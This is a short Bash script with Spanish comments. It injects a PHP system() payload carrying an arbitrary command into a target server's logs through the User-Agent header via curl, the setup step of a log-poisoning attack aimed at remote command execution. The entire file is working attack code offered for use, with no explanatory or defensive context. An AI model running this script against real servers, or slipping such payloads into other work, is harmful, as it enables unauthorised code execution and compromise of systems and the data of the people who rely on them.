#!/bin/bash

# Verificación de argumentos
if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <URL> <comando>"
    exit 1
fi

# Definición de variables
URL="$1"
COMMAND="$2"

# Formato del payload en PHP para ejecutar el comando
PAYLOAD="<?php system('$COMMAND'); ?>"

# Inyección del payload en el User-Agent usando curl
curl -s -X GET "$URL" -H "User-Agent: $PAYLOAD"

echo "[+] Payload inyectado en los logs con el comando: $COMMAND"
